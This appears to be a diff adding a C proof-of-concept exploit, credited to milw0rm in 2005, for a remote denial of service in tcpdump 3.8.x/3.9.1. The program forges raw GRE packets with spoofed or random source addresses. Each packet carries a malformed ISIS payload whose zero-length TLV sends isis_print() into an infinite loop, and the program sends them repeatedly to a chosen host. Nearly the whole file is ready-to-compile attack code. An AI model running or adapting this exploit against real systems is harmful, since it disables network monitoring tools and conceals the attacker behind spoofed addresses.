@@ -1,0 +1,244 @@
+/*[ tcpdump[3.8.x/3.9.1]: (ISIS) isis_print() infinite loop DOS. ]* 
+ *                                                                *
+ * by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)               *
+ *                                                                *
+ * compile:                                                       *
+ *  gcc xtcpdump-isis-dos.c -o xtcpdump-isis-dos                  *
+ *                                                                *
+ * tcpdump homepage/URL:                                          *
+ *  http://www.tcpdump.org                                        *
+ *                                                                *
+ * Tcpdump is a program that allows you to dump the traffic on a  *
+ * network. It can be used to print out the headers of packets on *
+ * a network interface that matches a given expression. You can   *
+ * use this tool to track down network problems, to detect "ping  *
+ * attacks" or to monitor the network activities.                 *
+ *                                                                *
+ * tcpdump(v3.9.1 and earlier versions) contains a remote denial  *
+ * of service vulnerability in the form of a single (GRE) packet  *
+ * causing an infinite loop.  the packet doesnt actually have to  *
+ * be an GRE packet, as the function is used in isoclns_print()   *
+ * which is used many places by tcpdump, however i went with GRE  *
+ * because it was the first one that popped up.                   *
+ *                                                                *
+ * as this bug doesn't appear to be fixed in the new(3.9.x/CVS)   *
+ * versions i'll elaborate on the problem.  the bug lies in       *
+ * isis_print()(called by isoclns_print()) in the                 *
+ * TLV_ISNEIGH_VARLEN portion of the code, be providing a zero    *
+ * length causing an infinite loop.                               *
+ *                                                                *
+ * some versions of tcpdump(depending on the platform/OS) need no *
+ * special command-line arguments to allow this to happen,        *
+ * however most need the "-v" argument.                           *
+ ******************************************************************/
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <signal.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#ifdef _USE_ARPA
+#include <arpa/inet.h>
+#endif
+
+/* doesn't seem to be standardized, so... */
+#if defined(__BYTE_ORDER) && !defined(BYTE_ORDER)
+#define BYTE_ORDER __BYTE_ORDER
+#endif
+#if defined(__BIG_ENDIAN) && !defined(BIG_ENDIAN)
+#define BIG_ENDIAN __BIG_ENDIAN
+#endif
+#if defined(BYTE_ORDER) && defined(BIG_ENDIAN)
+#if BYTE_ORDER == BIG_ENDIAN
+#define _USE_BIG_ENDIAN
+#endif
+#endif
+
+#define DFL_AMOUNT 5
+
+/* avoid platform-specific header madness. */
+/* (just plucked out of header files) */
+struct iph{
+#ifdef _USE_BIG_ENDIAN
+ unsigned char version:4,ihl:4;
+#else
+ unsigned char ihl:4,version:4;
+#endif
+ unsigned char tos;
+ unsigned short tot_len;
+ unsigned short id;
+ unsigned short frag_off;
+ unsigned char ttl;
+ unsigned char protocol;
+ unsigned short check;
+ unsigned int saddr;
+ unsigned int daddr;
+};
+struct greh{
+#ifdef _USE_BIG_ENDIAN
+  u_int8_t  check:1,routing:1,key:1,seq:1,strict:1,recur:3;
+  u_int8_t  flags:5,version:3;
+#else
+  u_int8_t  recur:3,strict:1,seq:1,key:1,routing:1,check:1;
+  u_int8_t  version:3,flags:5;
+#endif
+  u_int16_t protocol;
+};
+struct sumh{
+  unsigned int saddr;
+  unsigned int daddr;
+  unsigned char fill;
+  unsigned char protocol;
+  unsigned short len;
+};
+
+/* malformed ISIS data. (the bug) */
+static char payload[]=
+ "\x83\x1b\x01\x06\x12\x01\xff\x07\xff\xff"
+ "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+ "\xff\xff\xff\xff\xff\xff\x01\x07\x00\x00";
+
+/* prototypes. (and sig_alarm) */
+void gre_spoof(unsigned int,unsigned int);
+unsigned short in_cksum(unsigned short *,signed int);
+unsigned int getip(char *);
+void printe(char *,signed char);
+void sig_alarm(){printe("alarm/timeout hit.",1);}
+
+/* begin. */
+int main(int argc,char **argv) {
+ unsigned char nospoof=0;
+ unsigned int amt=DFL_AMOUNT;
+ unsigned int daddr=0,saddr=0;
+ printf("[*] tcpdump[3.8.x/3.9.1]: (ISIS) isis_print() infinite loop "
+ "DOS.\n[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\n\n");
+ if(argc<2){
+  printf("[*] syntax: %s <dst host> [src host(0=random)] [amount]\n",
+  argv[0]);
+  exit(1);
+ }
+ if(!(daddr=getip(argv[1])))
+  printe("invalid destination host/ip.",1);
+ if(argc>2)saddr=getip(argv[2]);
+ if(argc>3)amt=atoi(argv[3]);
+ if(!amt)printe("no packets?",1);
+ printf("[*] destination\t: %s\n",argv[1]);
+ if(!nospoof)
+  printf("[*] source\t: %s\n",(saddr?argv[2]:"<random>"));
+ printf("[*] amount\t: %u\n\n",amt);
+ printf("[+] sending(packet = .): ");
+ fflush(stdout);
+ while(amt--){
+  /* spice things up. */
+  srandom(time(0)+amt);
+  gre_spoof(daddr,saddr);
+  printf(".");
+  fflush(stdout);
+  usleep(50000);
+ }
+ printf("\n\n[*] done.\n");
+ fflush(stdout);
+ exit(0);
+}
+/* (spoofed) generates and sends a (GRE) ip packet. */
+void gre_spoof(unsigned int daddr,unsigned int saddr){
+ signed int sock=0,on=1;
+ unsigned int psize=0;
+ char *p,*s;
+ struct sockaddr_in sa;
+ struct iph ip;
+ struct greh gre;
+ struct sumh sum;
+ /* create raw (GRE) socket. */
+ if((sock=socket(AF_INET,SOCK_RAW,IPPROTO_GRE))<0)
+  printe("could not allocate raw socket.",1);
+ /* allow (on some systems) for the user-supplied ip header. */
+#ifdef IP_HDRINCL
+ if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)))
+  printe("could not set IP_HDRINCL socket option.",1);
+#endif
+ sa.sin_family=AF_INET;
+ sa.sin_addr.s_addr=daddr;
+ psize=(sizeof(struct iph)+sizeof(struct greh)+sizeof(payload)-1);
+ memset(&ip,0,sizeof(struct iph));
+ memset(&gre,0,sizeof(struct greh));
+ /* values not filled = 0, from the memset() above. */
+ ip.ihl=5;
+ ip.version=4;
+ ip.tot_len=htons(psize);
+ ip.saddr=(saddr?saddr:random()%0xffffffff);
+ ip.daddr=daddr;
+ ip.ttl=(64*(random()%2+1));
+ ip.protocol=IPPROTO_GRE;
+ ip.frag_off=64;
+ /* OSI. (to isoclns_print(), then to isis_print()) */
+ gre.protocol=htons(254);
+ /* needed for the ip checksum. */
+ sum.saddr=ip.saddr;
+ sum.daddr=ip.daddr;
+ sum.fill=0;
+ sum.protocol=ip.protocol;
+ sum.len=htons(sizeof(struct greh)+sizeof(payload)-1);
+ /* make sum/calc buffer for the ip checksum. (correct) */
+ if(!(s=(char *)malloc(sizeof(struct iph)+1)))
+  printe("malloc() failed.",1);
+ memset(s,0,(sizeof(struct iph)+1));
+ memcpy(s,&ip,sizeof(struct iph));
+ ip.check=in_cksum((unsigned short *)s,sizeof(struct iph));
+ free(s);
+ /* put the packet together. */
+ if(!(p=(char *)malloc(psize+1)))
+  printe("malloc() failed.",1);
+ memset(p,0,psize);
+ memcpy(p,&ip,sizeof(struct iph));
+ memcpy(p+sizeof(struct iph),&gre,sizeof(struct greh));
+ memcpy(p+(sizeof(struct iph)+sizeof(struct greh)),
+ payload,sizeof(payload));
+ /* send the malformed (GRE) packet. (ISIS data) */
+ if(sendto(sock,p,psize,0,(struct sockaddr *)&sa,
+ sizeof(struct sockaddr))<psize)
+  printe("failed to send forged GRE packet.",1);
+ free(p);
+ return;
+}
+/* standard method for creating TCP/IP checksums. */
+unsigned short in_cksum(unsigned short *addr,signed int len){
+ unsigned short answer=0;
+ register unsigned short *w=addr;
+ register int nleft=len,sum=0;
+ while(nleft>1){
+  sum+=*w++;
+  nleft-=2;
+ }
+ if(nleft==1){
+  *(unsigned char *)(&answer)=*(unsigned char *)w;
+  sum+=answer;
+ }
+ sum=(sum>>16)+(sum&0xffff);
+ sum+=(sum>>16);
+ answer=~sum;
+ return(answer);
+}
+/* gets the ip from a host/ip/numeric. */
+unsigned int getip(char *host){
+ struct hostent *t;
+ unsigned int s=0;
+ if((s=inet_addr(host))){
+  if((t=gethostbyname(host)))
+   memcpy((char *)&s,(char *)t->h_addr,sizeof(s));
+ }
+ if(s==-1)s=0;
+ return(s);
+}
+/* all-purpose error/exit function. */
+void printe(char *err,signed char e){
+ printf("[!] %s\n",err);
+ if(e)exit(e);
+ return;
+}
+
+// milw0rm.com [2005-04-26]
